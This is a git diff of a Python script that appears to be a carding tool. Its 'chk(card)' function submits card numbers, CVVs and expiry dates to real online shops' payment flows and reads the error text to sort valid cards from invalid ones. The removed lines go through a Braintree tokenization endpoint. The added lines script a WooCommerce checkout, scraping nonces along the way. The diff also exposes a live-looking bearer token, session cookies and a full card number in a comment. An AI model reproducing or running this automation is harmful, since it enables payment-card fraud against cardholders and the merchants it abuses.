@@ -86,107 +86,44 @@ def chk(card):
 
 
 
+	data = MultipartEncoder({
+    'quantity': (None, '1'),
+    'add-to-cart': (None, '547141'),
+})
 	headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU0MTE5OTgsImp0aSI6IjdhMzhhNzAyLWM5NzctNDk4Ni1hNWYxLWI3NGYzMDYyMWY1NiIsInN1YiI6InF5anJxNDR6Y2Q2czMyOWoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF5anJxNDR6Y2Q2czMyOWoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.PLCMfdRZoLT1jFSJuAcd_EIIcTyfTyjvnHNmEGDTrf0oWNKckJu9JOm5l2_BXAWofcWCsEBZkDuQoNW_lrCZtg',
-    'braintree-version': '2018-05-10',
-    'cache-control': 'no-cache',
-    'content-type': 'application/json',
-    'origin': 'https://assets.braintreegateway.com',
-    'pragma': 'no-cache',
-    'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'content-type': data.content_type,
+    'origin': 'https://cableandconnections.com',
+    'priority': 'u=0, i',
+    'referer': 'https://cableandconnections.com/product/shark-tooth-2-5-deep-round-box/',
+    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
 }
 
-	json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '537cf74d-5a3f-445f-bf63-9a4a34f8534b',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': n,
-                'expirationMonth': mm,
-                'expirationYear': yy,
-                'cvv': cvc,
-            },
-            'options': {
-                'validate': False,
-            },
-        },
-    },
-    'operationName': 'TokenizeCreditCard',
-}
 
-	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	response = r.post(
+    'https://cableandconnections.com/product/shark-tooth-2-5-deep-round-box/',
+    headers=headers,
+    data=data,  #دي كانت files حولتها ل داتا
+)
 
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"7c98af6d-33ea-40cd-821d-f763db0b5631"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4659017718276017","expirationMonth":"08","expirationYear":"2027","cvv":"351"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-	tok = response.json()['data']['tokenizeCreditCard']['token']
-#2
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	cookies = {
-    '_ga': 'GA1.1.1015169626.1733746575',
-    'cookie_notice_accepted': 'true',
-    'wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4': 'bbxbcbb.hhxbfbb-5641%7C1735398219%7CYhAGlC7QQWdRAOjHEUBrwgXQirCsdbV0TSID7mEZu2y%7Ce7d210b2843350fbf65e68a2fa38fc66d8d152794002518fb248ea291199d687',
-    'wfwaf-authcookie-8c84895040128b898589b5670ddc8148': '162%7Cother%7Cread%7C6070d56e9543a0dd5fcc7bbcb532f73f7e24da78d86a761d372b8079ebb6fbb7',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-12-27%2018%3A53%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-12-27%2018%3A53%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_50RCK7EFBE': 'GS1.1.1735325596.11.0.1735325596.0.0.0',
-}
 
 	headers = {
-    'authority': 'identityfashion.online',
+    'authority': 'cableandconnections.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_ga=GA1.1.1015169626.1733746575; cookie_notice_accepted=true; wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4=bbxbcbb.hhxbfbb-5641%7C1735398219%7CYhAGlC7QQWdRAOjHEUBrwgXQirCsdbV0TSID7mEZu2y%7Ce7d210b2843350fbf65e68a2fa38fc66d8d152794002518fb248ea291199d687; wfwaf-authcookie-8c84895040128b898589b5670ddc8148=162%7Cother%7Cread%7C6070d56e9543a0dd5fcc7bbcb532f73f7e24da78d86a761d372b8079ebb6fbb7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2018%3A53%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2018%3A53%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; _ga_50RCK7EFBE=GS1.1.1735325596.11.0.1735325596.0.0.0',
-    'origin': 'https://identityfashion.online',
     'pragma': 'no-cache',
-    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
+    'referer': 'https://cableandconnections.com/cart/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -198,28 +135,105 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
+	response = r.get('https://cableandconnections.com/checkout/', headers=headers)
+
+	lol = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
+
+	lle = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
+
+	add = re.search(r'"address_validation_nonce":"(.*?)"', response.text).group(1)
+
+	headers = {
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://cableandconnections.com',
+    'priority': 'u=1, i',
+    'referer': 'https://cableandconnections.com/checkout/',
+    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+# دا ريكوست بتاع زر تأكيد العنوان طلعت متغير وربطته
 	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'visa',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '{"correlation_id":"53f962a2aa7860e0da704a408e524236"}',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': '71a9674955',
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
+    'action': 'wc_avatax_validate_customer_address',
+    'nonce': add,
+    'type': 'billing',
+    'address_1': 'HBDBFV',
+    'address_2': '',
+    'city': 'NEWYORK',
+    'state': 'NY',
+    'country': 'US',
+    'postcode': '10080',
 }
 
-	response = requests.post(
-    'https://identityfashion.online/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
+	response = r.post('https://cableandconnections.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+
+
+
+	headers = {
+    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://cableandconnections.com',
+    'priority': 'u=1, i',
+    'referer': 'https://cableandconnections.com/checkout/',
+    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+	params = {
+    'wc-ajax': 'update_order_review',
+}
+#ضفت هنا حرف ال f
+	data = f'security={lle}&payment_method=acceptbluecard&country=US&state=NY&postcode=10080-0001&city=NEWYORK&address=HBDBFV&address_2=&s_country=US&s_state=NY&s_postcode=10080-0001&s_city=NEWYORK&s_address=HBDBFV&s_address_2=&has_full_address=true&post_data=billing_email%3Dadfeaqfa%2540gmail.com%26billing_password%3D%26account_username%3D%26wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fcableandconnections.com%252F%26wc_order_attribution_session_start_time%3D2024-12-28%252000%253A21%253A10%26wc_order_attribution_session_pages%3D7%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F131.0.0.0%2520Safari%252F537.36%26billing_first_name%3DChrista%26billing_last_name%3Dafadf%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DHBDBFV%26billing_address_2%3D%26billing_city%3DNEWYORK%26billing_state%3DNY%26billing_postcode%3D10080-0001%26billing_phone%3D9195157627%26b2bking_js_based_invalid%3D0%26b2bking_registration_roles_dropdown%3D%26b2bking_custom_field_520732%3D%26b2bking_vat_number_registration_field_number%3D520732%26shipping_first_name%3DChrista%26shipping_last_name%3Dafadf%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3DHBDBFV%26shipping_address_2%3D%26shipping_city%3DNEWYORK%26shipping_state%3DNY%26shipping_postcode%3D10080-0001%26order_comments%3D%26payment_method%3Dacceptbluecard%26acceptbluecard-card-name%3Dgrgfg%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{lol}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%26shipping_method%255B0%255D%3D125188_collect_0&shipping_method%5B0%5D=125188_collect_0'
+
+	response = r.post('https://cableandconnections.com/', params=params, headers=headers, data=data)
+
+
+#2
+
+
+	headers = {
+    'authority': 'cableandconnections.com',
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://cableandconnections.com',
+    'pragma': 'no-cache',
+    'referer': 'https://cableandconnections.com/checkout/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+
+	params = {
+    'wc-ajax': 'checkout',
+}
+# وهنا برضو كان لازم تحط f
+	data = f'billing_email=moh5527vbnm%40gmail.com&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fcableandconnections.com%2Fshop%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fcableandconnections.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-12-27+23%3A53%3A27&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=bbxbcbb&billing_last_name=hhxbfbb&billing_company=&billing_country=US&billing_address_1=HBDBFV&billing_address_2=HHFHFBFV&billing_city=NEW+YORK&billing_state=NY&billing_postcode=10080-0001&billing_phone=2153652415&b2bking_js_based_invalid=0&shipping_first_name=bbxbcbb&shipping_last_name=hhxbfbb&shipping_company=&shipping_country=US&shipping_address_1=HHFHFBFV&shipping_address_2=HBDBFV&shipping_city=NEW+YORK&shipping_state=NY&shipping_postcode=10080-0001&order_comments=&payment_method=acceptbluecard&wc-acceptbluecard-payment-token=new&acceptbluecard-card-name=youssef+&acceptblue-cardnumber={n}&acceptblue-card_cvc={cvc}&acceptblue-expiry_m={mm}&acceptblue-expiry_y={yy}&terms=on&terms-field=1&woocommerce-process-checkout-nonce={lol}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&shipping_method%5B0%5D=125188_collect_0&exemption-zone='
+
+	response = r.post('https://cableandconnections.com/', params=params, headers=headers, data=data)
 	text = response.text
-	pattern = r'Status code (.*?)\s*</li>'
+	pattern = r"Payment Failed with message: &#039;(.*?)&#039;"
 	
 	
 	match = re.search(pattern, text)
